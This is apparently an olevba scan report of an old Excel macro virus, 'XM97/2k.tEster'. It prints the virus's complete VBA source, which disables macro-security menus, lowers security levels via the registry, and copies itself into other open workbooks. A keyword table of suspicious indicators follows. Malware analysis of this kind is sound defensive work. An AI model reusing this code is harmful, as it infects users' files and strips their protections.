olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tester-f1f809b769c123da43094a2dd7ea85a0739521b6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Tento_sešit.cls 
in file: Virus.MSExcel.Tester-f1f809b769c123da43094a2dd7ea85a0739521b6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tento_sešit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'XM97/2k.tEster

Sub Workbook_Deactivate()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = 0&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1&
Set ActiveBook = ActiveWorkbook.VBProject.VBComponents("Tento_sešit").CodeModule        'cz
Set ActiveBook = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule       'us
Set ActiveBook = ActiveWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule  'de
Set ThisBook = ThisWorkbook.VBProject.VBComponents("Tento_sešit").CodeModule            'cz
Set ThisBook = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule           'us
Set ThisBook = ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule      'de
vxCopy = ThisBook.Lines(1, ThisBook.countoflines)
If ActiveBook.Lines(1, 1) <> "'XM97/2k.tEster" Then
 ActiveBook.deletelines 1, ActiveBook.countoflines
 ActiveBook.insertlines 1, vxCopy
 If ActiveWorkbook.Path = "" Then
  ActiveWorkbook.SaveAs ActiveWorkbook.FullName
 Else
  ActiveWorkbook.Save
 End If
End If
'XM97/2k.tEster by gl_st0rm of [mions]
End Sub
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Tester-f1f809b769c123da43094a2dd7ea85a0739521b6 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Tester-f1f809b769c123da43094a2dd7ea85a0739521b6 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Tester-f1f809b769c123da43094a2dd7ea85a0739521b6 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

